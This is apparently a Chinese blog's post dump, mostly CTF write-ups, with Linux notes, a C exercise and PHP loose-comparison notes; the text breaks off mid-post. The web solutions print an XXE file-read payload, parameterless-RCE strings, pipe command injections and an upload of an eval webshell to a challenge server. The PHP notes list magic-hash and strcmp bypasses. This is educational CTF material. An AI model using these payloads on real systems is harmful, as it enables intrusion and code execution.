R1E0RElOSlVHTTJUSU5CV0c1QkRHTkJUR01aVFFOUlRHWTJER05SVEdVWlRJTlJVR1laVEdPQlRHVTNES05SVkdZWlRHTkpUR0kzREdOUlZHWTJETU1KV0dJWlRJTVpaR1kyREdNWldHUVpURU5SV0dNM1RNTkpXR0UzVUk9PT0&#x3D; base64解密 GQ4DINJUGM2TINBWG5BDGNBTGMZTQNRTGY2DGNRTGUZTINRUGYZTGOBTGU3DKNRVGYZTGNJTGI3DGNRVGY2DMMJWGIZTIMZZGY2DGMZWGQZTENRWGM3TMNJWGE3UI&#x3D;&#x3D;&#x3D; base32解密 48454354467B34333863643635346463383565656335326365646162343964336432663765617D 十六进制转字符串 HECTF&#123;438cd654dc85eec52cedab49d3d2f7ea&#125; rsa题目：RRRRRRRSSSSSSSSAAAAAAA~~~~~~~ rsa.txt n &#x3D; 11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423 e &#x3D; 65537 c &#x3D; 575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820 首先分解p、q，使用http://factordb.com/在线解密 import gmpy2 n = 11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423 e = 65537 c = 575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820 p = 2499568793 q = 4568695582742345507136251229217400959960856046691733722988345503429689799935696593516299458516865110324638359470761456115925725067558499862591063153473862179550706262380644940013531317571260647226561004191266100720745936563550699000939117068559232225644277283541933064331891245169739139886735615435506152070330233107807124410892978280063993668726927377177983100529270996547002022341628251905780873531481682713820809147098305289391835297208890779643623465917824350382592808578978330348769060448006691307027594085634520759293965723855183484366752511654099121387261343686017189426761536281948007104498017003911 phi = (p-1) * (q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(libnum.n2s(m)) flag&#123;8fb873baba0df4a6423be9f4bd525d93&#125; no blank space题目：出题人的电脑年久失修，空格键失灵了，你能找到电报里的秘密吗(注:flag内字母全部大写） flag格式：HECTF{.+} hint：试试别的电报码叭 hint：古老的5bit编码 cipher.txt .-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----. 博多码 将.换成1，-换成0 &lt;?php $a = '.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----.'; $a = str_replace('.', '1', $a); $a = str_replace('-', '0', $a); echo $a; ?> 10100000010111010000011011000010100110111011111111001011101110111111110010101100100001110011011101101111101010001011101100001 用这个网站解码：Baudot Code, Baudot-Murray Code (online tool) | Boxentriq HECTFTH1S1SNTM0RS3 整理下得到flag HECTF&#123;TH1S1SNTM0RS3&#125; 也可以一个一个对照解码 10100 H 00001 E 01110 C 10000 T 01101 F 10000 T 10100 H 11011 切换到数字 10111 1 11111 切换到字母 00101 S 11011 切换到数字 10111 1 11111 切换到字母 00101 S 01100 N 10000 T 11100 M 11011 切换到数字 10110 0 11111 切换到字母 01010 R 00101 S 11011 切换到数字 00001 3","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://flag2020.top/tags/writeup/"}]},{"title":"第三届海啸杯 write up","slug":"第三届海啸杯 write up","date":"2020-11-18T16:00:00.000Z","updated":"2021-04-09T14:01:51.629Z","comments":true,"path":"posts/20201119.html","link":"20201119","permalink":"https://flag2020.top/posts/20201119.html","excerpt":"web &amp; misc &amp; crypto","text":"web &amp; misc &amp; crypto WEBG2mtu学生?X-Forwarded-For绕过、Cookie伪造 用Burp Suite抓包，将user=0改为user=1，添加X-Forwarded-For:127.0.0.1 Who are you？用Burp suite抓包，发现 &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;feedback&gt;&lt;author&gt;aaa&lt;&#x2F;author&gt;&lt;&#x2F;feedback&gt; 好像是XXE漏洞，在书上查看攻击方式 尝试用php伪协议读取flag.php &lt;?xml version&#x3D;&quot;1.0&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot; &gt; ]&gt; &lt;xml&gt; &lt;xxe&gt;&amp;b;&lt;&#x2F;xxe&gt; &lt;&#x2F;xml&gt; 发现读不出来，跳转到根目录下读取也不行 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.php 尝试读取index.php，读取成功，得到 PD9waHANCmxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIoZmFsc2UpOw0KJGRhdGEgPSBAZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7DQokcmVzcCA9ICcnOw0KLy8kZmxhZz0nZmxhZ3s3OWQxMDYyNi1kMjdmLTQ1NjktYTYyOS1jOTYwNmQwMzc4ZjJ9JzsNCmlmKCRkYXRhICE9IGZhbHNlKXsNCiAgICAkZG9tID0gbmV3IERPTURvY3VtZW50KCk7DQogICAgJGRvbS0+bG9hZFhNTCgkZGF0YSwgTElCWE1MX05PRU5UKTsNCiAgICBvYl9zdGFydCgpOw0KICAgICRyZXMgID0gJGRvbS0+dGV4dENvbnRlbnQ7DQogICAgJHJlc3AgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICBpZiAoJHJlcyl7DQogICAgICAgIGRpZSgkcmVzKTsNCiAgICB9DQoNCn0NCj8+DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCjxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICA8dGl0bGU+d2VsY29tZTwvdGl0bGU+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL3N0eWxlLmNzcyI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iaWU9ZWRnZSI+DQoNCjwvaGVhZD4NCjxib2R5IGNsYXNzPSJjb250YWN0Qm9keSI+DQo8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4NCiAgICA8ZGl2IGNsYXNzPSJ0aXRsZSI+DQoNCg0KICAgIDwvZGl2Pg0KDQoNCiAgICA8Zm9ybSBtZXRob2Q9InBvc3QiIGNsYXNzPSJmb3JtIj4NCiAgICAgICAgPGgxIGlkPSJ0aXRsZSI+6K+36L6T5YWl5aeT5ZCNPC9oMT4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJuYW1lIGVudHJ5ICIgaWQ9Im5hbWUiIG5hbWU9Im5hbWUiIHBsYWNlaG9sZGVyPSJZb3VyIE5hbWUiLz4NCiAgICA8L2Zvcm0+DQogICAgPGJ1dHRvbiBjbGFzcz0ic3VibWl0IGVudHJ5IiBvbmNsaWNrPSJmdW5jKCkiPlN1Ym1pdDwvYnV0dG9uPg0KDQogICAgPGRpdiBjbGFzcz0ic2hhZG93Ij48L2Rpdj4NCjwvZGl2Pg0KDQo8L2JvZHk+DQo8L2h0bWw+DQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQogICAgZnVuY3Rpb24gcGxheSgpIHsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBmdW5jdGlvbiBmdW5jKCkgew0KICAgICAgICAvLyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgpLnZhbHVlDQogICAgICAgIHZhciB4bWwgPSAnJyArDQogICAgICAgICAgICAnPFw&#x2F;eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ilw&#x2F;PicgKw0KICAgICAgICAgICAgJzxmZWVkYmFjaz4nICsNCiAgICAgICAgICAgICc8YXV0aG9yPicgKyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmFtZScpLnZhbHVlKyAnPC9hdXRob3I+JyArDQogICAgICAgICAgICAnPC9mZWVkYmFjaz4nOw0KICAgICAgICBjb25zb2xlLmxvZyh4bWwpOw0KICAgICAgICB2YXIgeG1saHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICB4bWxodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHsNCiAgICAgICAgICAgIGlmICh4bWxodHRwLnJlYWR5U3RhdGUgPT0gNCkgew0KICAgICAgICAgICAgICAgIC8vIGNvbnNvbGUubG9nKHhtbGh0dHAucmVhZHlTdGF0ZSk7DQogICAgICAgICAgICAgICAgLy8gY29uc29sZS5sb2coeG1saHR0cC5yZXNwb25zZVRleHQpOw0KICAgICAgICAgICAgICAgIHZhciByZXMgPSB4bWxodHRwLnJlc3BvbnNlVGV4dDsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGl0bGUnKS50ZXh0Q29udGVudCA9IHJlcw0KICAgICAgICAgICAgfQ0KICAgICAgICB9Ow0KICAgICAgICB4bWxodHRwLm9wZW4oIlBPU1QiLCAiaW5kZXgucGhwIiwgdHJ1ZSk7DQogICAgICAgIHhtbGh0dHAuc2VuZCh4bWwpOw0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfTsNCjwvc2NyaXB0Pg0KPC9ib2R5Pg0KPC9odG1sPg&#x3D;&#x3D; 用base64解密，得到源码，flag就在源码里 &lt;?php libxml_disable_entity_loader(false); $data = @file_get_contents('php://input'); $resp = ''; //$flag='flag&#123;79d10626-d27f-4569-a629-c9606d0378f2&#125;'; if($data != false)&#123; $dom = new DOMDocument(); $dom->loadXML($data, LIBXML_NOENT); ob_start(); $res = $dom->textContent; $resp = ob_get_contents(); ob_end_clean(); if ($res)&#123; die($res); &#125; &#125; ?> &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;title>welcome&lt;/title> &lt;link rel=\"stylesheet\" href=\"./style.css\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"> &lt;/head> &lt;body class=\"contactBody\"> &lt;div class=\"wrapper\"> &lt;div class=\"title\"> &lt;/div> &lt;form method=\"post\" class=\"form\"> &lt;h1 id=\"title\">è¯·è¾å¥å§å&lt;/h1> &lt;br/> &lt;br/> &lt;br/> &lt;input type=\"text\" class=\"name entry \" id=\"name\" name=\"name\" placeholder=\"Your Name\"/> &lt;/form> &lt;button class=\"submit entry\" onclick=\"func()\">Submit&lt;/button> &lt;div class=\"shadow\">&lt;/div> &lt;/div> &lt;/body> &lt;/html> &lt;script type=\"text/javascript\"> function play() &#123; return false; &#125; function func() &#123; // document.getElementById().value var xml = '' + '&lt;\\?xml version=\"1.0\" encoding=\"UTF-8\"\\?>' + '&lt;feedback>' + '&lt;author>' + document.getElementById('name').value+ '&lt;/author>' + '&lt;/feedback>'; console.log(xml); var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = function () &#123; if (xmlhttp.readyState == 4) &#123; // console.log(xmlhttp.readyState); // console.log(xmlhttp.responseText); var res = xmlhttp.responseText; document.getElementById('title').textContent = res &#125; &#125;; xmlhttp.open(\"POST\", \"index.php\", true); xmlhttp.send(xml); return false; &#125;; &lt;/script> &lt;/body> &lt;/html> 无参数RCE&lt;?php //flag in flag.php $a=\"\"; if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) &#123; if(preg_match(\"/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/\", $_GET['code']))&#123; die(\"no no no !\"); &#125; eval(\"\\$a=\".$_GET['code']); if(preg_match('/flag/', $a))&#123; die(\"no\"); &#125; echo($a); &#125; else &#123; show_source(__FILE__); &#125; ?> 利用SESSIONID来传参，读取flag &#x2F;?code&#x3D;Show_source(Session_id(Session_start())); PHPSESSID&#x3D;flag.php 或者： 用scandir()读取目录源码，但必须带有参数（’.’），无法通过正则匹配 用pos()取localeconv()返回的数组的第一个元素，也就是”.” 但pos()被过滤了，用current()替换，print_r也被过滤了，尝试用大写 &#x2F;?code&#x3D;Print_r(scandir(current(localeconv()))); 得到 Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; admin.php [3] &#x3D;&gt; flag.php [4] &#x3D;&gt; hahaha.php [5] &#x3D;&gt; index.php ) 1 hint：反转，随机数 &#x2F;?code&#x3D;Var_dump(Readfile(array_rand(array_flip(scandir(Pos(localeconv())))))); 一直刷新，直到看到int(55)，查看源码也可以看到flag readfile() 输出一个文件 array_rand() 函数返回数组中的随机键名，或者如果规定函数返回不只一个键名，则返回包含随机 键名的数组。 array_flip() 函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。 神奇的登录框看了宇豪师兄的博客：浅谈ctf中无回显，才知道怎么做 |ls &gt; 1.txt 1.txt flagggg.php index.php |cat flagggg.php &gt; 2.txt cms参考：[代码审计]XiaoCms（后台任意文件上传至getshell,任意目录删除,会话固定漏洞 管理员账号：admin 密码：admin8888 在管理员后台新建表单 &lt;html&gt; &lt;body&gt; &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;129.204.81.127:6333&#x2F;admin&#x2F;index.php?c&#x3D;uploadfile&amp;a&#x3D;uploadify_upload&amp;type&#x3D;php&amp;size&#x3D;1000&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 上传一句话木马 test3.php &lt;?php @eval($_POST['cmd']); 点击提交，得到文件路径 http://129.204.81.127:6333/data/upload/file/202011/28022b121a56bd7461ecdb38db70cd1f.php 用蚁剑打开，密码为cmd，在文件根目录下找到flag misc表白用010editor打开，修改图片高度，就可以看到flag 老烟枪将cxk.jpg拖到kali，提取隐藏文件 binwalk -e cxk.jpg 得到flag.png，用ps水平翻转，就可以看清楚flag lsbLSB隐写，用Stegsolve打开，点Analyse-Data Extract 点击Save Bin 保存为1.png，是一张二维码，扫码就可以得到flag 你能破解吗?hint：压缩包密码为g2mtu加四位数字 生成密码字典 file = open(\"1.dic\",\"w\") for i in range(1000,10000): file.write(\"g2mtu\"+str(i)+\"\\n\") file.close() 解压得到flag.txt dGhpcyBpcyB5b3VyIGZsYWd7dzNsZTBjb21lX3RvX0cybXRVY1RmfQ&#x3D;&#x3D; 用base64解密得到flag flag&#123;w3le0come_to_G2mtUcTf&#125; disk参考：2020易博霖CTFMisc2–Disk题解 用提取隐藏文件 readme： Q:where is passw0rd? A:Be Deleted. 应该要恢复被删除的密码的，可是extundelete安装不了 只能用010editor打开disk0，查找有没有密码 尝试了好几个：password，passw0rd，passwd，pass，word，ps，wd 最后找到一个类似密码的东西 don0tgu355p@sswd 解压lever1.zip，得到flag.png 修改图片高度就可以得到flag Crypto恺撒将军题目： 恺撒将军使用了一种技术运筹帷幄，指挥千里将士决胜千里。 敌军正好截获了一串密文 ]p{k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@ offset: 3 用java String字符串与Ascii互相转换的代码解密 Test02 public class Test02 &#123; public static void main(String[] args) &#123; String string = \"]p&#123;k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@\"; StringBuilder sb = new StringBuilder(); char[] ch = string.toCharArray(); for (int i = 0; i &lt; ch.length; i++) &#123; sb.append(Integer.valueOf(ch[i]).intValue()-3).append(\" \");// 加空格 &#125; System.out.println(sb.toString()); &#125; &#125; 90 109 120 104 90 51 116 106 99 110 108 119 100 71 57 102 97 88 78 102 97 72 104 105 88 51 78 118 88 50 86 66 99 51 107 119 102 81 61 61 Test03 public class Test03 &#123; public static void main(String[] args) &#123; String value = \"90 109 120 104 90 51 116 106 99 110 108 119 100 71 57 102 97 88 78 102 97 72 104 105 88 51 78 118 88 50 86 66 99 51 107 119 102 81 61 61 \"; StringBuffer sbu = new StringBuffer(); String[] chars = value.split(\" \"); for (int i = 0; i &lt; chars.length; i++) &#123; sbu.append((char) Integer.parseInt(chars[i])); &#125; System.out.println(sbu.toString()); &#125; &#125; ZmxhZ3tjcnlwdG9faXNfaHhiX3NvX2VBc3kwfQ&#x3D;&#x3D; base64解密后得到flag flag&#123;crypto_is_hxb_so_eAsy0&#125; 小明家的小菜园题目： 小明家菜园要建栅栏，请教了他心爱的女神，女神给了这么点提示，他却看不懂，你能帮助他吗？ f_tnluz_aghggeao{t_oy_ldoia} 栅栏密码 flag&#123;yo_uget_itzha_lan_good&#125; 战报我军成功捣毁敌军秘密电台缴获密文和明文一份，但是还有一份密文难以破解特请你来破译密码： 待解密文：givfome 用脚本进行词频分析 import sys alphabet = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =&#123;&#125;[]\" data = input() result = &#123;d:0 for d in alphabet&#125; def sort_by_value(d): items = d.items() backitems = [[v[1],v[0]] for v in items] backitems.sort(reverse=True) print(backitems,'\\n\\n') return [ backitems[i][1] for i in range(0,len(backitems))] for d in data: for alpha in alphabet: if d == alpha: result[alpha] = result[alpha] + 1 print(''.join(sort_by_value(result))) 密文： givfometjlysnhuczkwbrqdxpa&#125;&#123;_^][ZYXWVUTSRQPONMLKJIHGFEDCBA@&#x3D;9876543210-+*)(&amp;%$#! 明文： eantosirlhugdpcmf0wybvkA)(S21xTPC86-zjWLE4qUNMIGB53&#125;&#123;_^] ZYXVRQOKJHFD@&#x3D;97+*&amp;%$#! 解密密文：givfome，得到flag flag&#123;eantosi&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://flag2020.top/tags/writeup/"}]},{"title":"学习笔记——Linux","slug":"学习笔记——Linux","date":"2020-11-11T16:00:00.000Z","updated":"2021-04-09T14:51:48.750Z","comments":true,"path":"posts/20201112.html","link":"20201112","permalink":"https://flag2020.top/posts/20201112.html","excerpt":"Linux学习笔记","text":"Linux学习笔记 Linux是开源的操作系统，系统特点有：开放性（开源）、多用户、多任务、良好的用户界面、优异的性能与稳定性等等。 学习笔记目录： 文件目录结构 终端 路径 指令 文件目录结构 bin：全称binary，含义是二进制。该目录中存储的都是一些二进制文件，文件都是可以被运行的。 dev：该目录中主要存放的是外接设备，例如盘、其他的光盘等。在其中的外接设备是不能直接被使用的，需要挂载（类似windows下的分配盘符）。 etc：该目录主要存储一些配置文件。 home：表示“家”，表示除了root用户以外其他用户的家目录，类似于windows下的User/用户目录。 mnt：当外接设备需要挂载的时候，就需要挂载到mnt目录下。 proc：process，表示进程，该目录中存储的是Linux运行时候的进程。 root：该目录是root用户自己的家目录。 sbin：全称super binary，该目录也是存储一些可以被执行的二进制文件，但是必须得有super权限的用户才能执行。 tmp：表示“临时”的，当系统运行时候产生的临时文件会在这个目录存着。 usr：存放的是用户自己安装的软件。类似于windows下的program files。 var：存放的程序/系统的日志文件的目录。 终端 kali：当前终端登录的用户名 @：发音at，表示”在“ kali：当前登录的主机名 ~/桌面：当前终端的工作目录 $：身份识别符，如果是超级管理员登录则显示#，否则显示$符号 超级管理员终端界面如下： 路径路径可以分为两种：相对路径和绝对路径 相对路径： ./：表示当前目录下；../：表示当前目录下 绝对路径： /：从根目录下寻找对应路径 在Linux中有一个特殊的符号“~”，表示当前用户的家目录。 指令Linux指令通用格式 #指令主体（空格） [选项]（空格） [操作对象] 一个指令可以包含多个选项 操作对象也可以是多个 ls(list) ls 列出当前工作目录下的所有文件/文件夹的名称 ls 路径 列出指定路径下的所有文件/文件夹的名称 ls 选项 路径 ls -l 路径 -l：表示list，表示以详细列表的形式进行展示 ls -a 路径 -a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹） ls -lh 路径 -lh：-a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹） pwd(print working directory) pwd 打印当前工作目录 cd(change directory) cd 路径 切换到路径所在目录 mkdir(make directory) mkdir 路径 创建目录，可以是文件夹名称也可以是包含名称的一个完整路径 mkdir -p 路径 当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错 mkdir 路径1 路径2 路径3 … 表示一次性创建多个目录 touch创建文件 touch 文件路径 文件路径可以是直接的文件名也可以是路径，touch也可以同时创建多个文件 clear clear 清屏 cp(copy) cp 被复制的文档路径 文档被复制到的路径 复制文档到新路径下的位置，在复制过程中是可以对新位置的文件重命名的 cp -r 被复制的文件夹路径 文件夹被复制到的路径 -r表示递归复制 mv(move) mv 需要移动的文档路径 需要保存的位置路径 移动文档到新位置，原始文件在移动后不在原始位置 mv 需要移动的文件夹路径 需要保存的位置路径 移动一个文件夹，同移动文档 注： 在Linux中重命名的命令也是mv，语法和移动语法一样 如：重命名根目录下的a.txt为b.txt mv /a.txt /b.txt rm(remove) rm 选项 需要移除的文档路径 rm -f 需要移除的文档路径 force：表示强制删除，不提示是否删除 rm -r 需要移除的文件夹路径 -r：表示递归，删除一个目录的时候需要做递归删除，并且一般也不需要进行删除确认询问，所以移除目录的时候一般需要使用-rf选项 rm -rf 文档路径/文件夹路径/… 删除多个文档和文件夹 注： 要删除一个目录下有公共特性的文档，例如以test开头的文档，可以使用通配符* rm -f test* 表示强制删除只要文件是以test开头的，后续字符不管的文档 输出重定向一般命令的输出都会显示在终端中，有些时候需要将一些命令的执行结果想要保存到文件中进行后续的分析/统计，则这时候需要使用到的输出重定向技术。 &gt;：覆盖输出，会覆盖掉原先的文件内容 &gt;&gt;：追加输出，不会覆盖原始文件内容，会在原始内容末尾继续添加 正常执行的指令 &gt;/&gt;&gt; 文件的路径 注：文件可以不存在，不存在则新建 如：使用覆盖重定向，保存 ls -lah 的执行结果到当前目录下的 ls.txt ls -lah &gt; ls.txt cat cat 文档路径 直接打开一个文档，结果输出在终端 cat 文档路径1 文档路径2 … 文档路径n &gt; 文档路径x 配合输出重定向，将文档路径1到文档路径n的内容合并到文档路径x 管道管道符：| 管道一般可以用于“过滤”，“特殊”，“扩展处理”。 指令A | 指令B 指令A的正确输出作为指令B的操作对象 grep指令：主要用于过滤 du -sh du -sh 目录路径 查看目录的真实大小 -s：summaries，只显示汇总的大小 -h：表示以高可读性的形式进行显示 如：统计”/etc“目录实际大小 du -sh /etc/ date %F：等价于%Y-%m-%d %T：等价于%H:%M:%S %F：表示完整的年月日 %T：表示完整的时分秒 %Y：表示四位年份 %m：表示两位月份（带前导0） %d：表示日期（带前导0） %H：表示小时（带前导0） %M：表示分钟（带前导0） %S：表示秒数（带前导0）","categories":[{"name":"Notes","slug":"Notes","permalink":"https://flag2020.top/categories/Notes/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://flag2020.top/tags/Linux/"}]},{"title":"一道ACM测试赛的题目","slug":"一道ACM测试赛的题目","date":"2020-10-28T16:00:00.000Z","updated":"2021-04-09T14:56:41.661Z","comments":true,"path":"posts/20201029.html","link":"20201029","permalink":"https://flag2020.top/posts/20201029.html","excerpt":"一篇划水文章","text":"一篇划水文章 查找缺失的元素描述：给定一个数组，找出其中的最大值n，输出[0,n]在该数组中缺失的元素。 输入：输入任意个自然数，当输入为-1时，结束输入。 输出：输出缺失的元素，每两个元素之间用空格分隔。 例1： 输入：0 1 4 -1 输出：2 3 例2： 输入：5 8 -1 输出：0 1 2 3 4 6 7 分析① 输入数字，直到输入-1则停止输入 ② 找到数组中的最大值 ③ 输出[0,n]在该数组中缺失的元素 ① 输入数字，直到输入-1则停止输入#include&lt;stdio.h> int main() &#123; int a[100]; int i = 0; int x; scanf(\"%d\", &amp;x); while(x != -1)&#123; a[i++] = x; scanf(\"%d\", &amp;x); &#125; return 0; &#125; ② 找到数组中的最大值#include&lt;stdio.h> int main() &#123; int a[100]; int i = 0; int x; scanf(\"%d\", &amp;x); while(x != -1)&#123; a[i++] = x; scanf(\"%d\", &amp;x); &#125; int max = a[0]; int j; for(j=1; j&lt;i; j++)&#123; if(a[j] > max)&#123; max = a[j]; &#125; &#125; return 0; &#125; ③ 输出[0,n]在该数组中缺失的元素#include&lt;stdio.h> int main() &#123; int a[100]; int i = 0; int x; scanf(\"%d\", &amp;x); while(x != -1)&#123; a[i++] = x; scanf(\"%d\", &amp;x); &#125; int max = a[0]; int j; for(j=1; j&lt;i; j++)&#123; if(a[j] > max)&#123; max = a[j]; &#125; &#125; int tag = 0; int k = 0; for(k=0; k&lt;max; k++)&#123; for(j=0; j&lt;i; j++)&#123; if(k == a[j])&#123; tag = 1; break; &#125; &#125; if(tag == 0)&#123; printf(\"%d\", k); if(k != max-1)&#123; printf(\" \"); &#125; &#125;else&#123; tag = 0; &#125; &#125; return 0; &#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://flag2020.top/categories/Notes/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"https://flag2020.top/tags/ACM/"}]},{"title":"PHP 弱类型比较问题","slug":"PHP 弱类型比较问题","date":"2020-10-27T16:00:00.000Z","updated":"2021-04-10T05:36:43.526Z","comments":true,"path":"posts/20201028.html","link":"20201028","permalink":"https://flag2020.top/posts/20201028.html","excerpt":"PHP是一门弱类型语言，存在弱类型比较问题","text":"PHP是一门弱类型语言，存在弱类型比较问题 PHP 弱类型比较问题 字符串和数字比较时，会先把字符串转换为数字，不能转换为数字的字符串或null，被转换为0。 bool true和任何比较都相等，除了0和false，因为0认为是bool false。 md5或者sha不能加密数组，所以在加密数组的时候会返回false。 “0x”开头跟数字的字符串（例如”0x1e240”）会被当作16进制数去比较。 只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，即0e\\d+的字符串 == ‘0’ 为true。 PHP5.3以上版本的strcmp()存在漏洞，只要$_GET[‘password’]是一个数组或者一个object即可绕过。 字符串 md5() 240610708 0e462097431906509019562988736854 QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 参考： PHP官方手册——比较运算符 PHP 弱类型比较总结 “==”与“===”== 数据类型不一样的时候会将数据类型转换为相同的再进行比较 === 除了对数据的值进行比较还会对数据的类型进行比较 &lt;?php $o = $_GET['o']; if(is_numeric($o))&#123; die(\"no hack!!\"); &#125; if($o==520)&#123; echo \"U are right!\"; &#125; ?> 输入520，则：no hack!! 输入520a，则：U are right! &lt;?php echo intval('520a').'&lt;br>'; echo intval('a520'); ?> 520 a &lt;?php var_dump('1'==1); echo \"&lt;br>\"; var_dump('1'===1); ?> bool(true)bool(false) &lt;?php var_dump('0e12' == '0e34'); var_dump('0e12' === '0e34'); ?> bool(true)bool(false) switch弱类型比较问题switch中同样存在弱类型比较问题，原理和上面类似 &lt;?php $i =\"3a\"; switch ($i) &#123; case 0: case 1: case 2: echo \"this is two\"; break; case 3: echo \"flag\"; break; &#125; ?> 最终输出 flag 字符串和数字比较字符串和数字比较时，会先把字符串转换为数字，不能转换为数字的字符串或null，被转换为0。 如：”a”或”a1”是不能转换为数字的字符串，而”1”或”1a”是可以转换为数字的字符串 &lt;?php var_dump('a' == 0); var_dump('a' == 1); var_dump('1' == 1); var_dump('1a' == 1); var_dump('a1' == 1); var_dump('12a' == 1); ?> bool(true)bool(false)bool(true)bool(true)bool(false)bool(false) 布尔值true和任意比较bool true和任何比较都相等，除了0和false，因为0认为是bool false。 &lt;?php var_dump(true == 0); var_dump(true == 'False'); var_dump(true == 2); var_dump(true == '2'); ?> bool(false)bool(true)bool(true)bool(true) md5()、sha1()哈希函数相等问题&lt;?php if (isset($_GET['a']) and 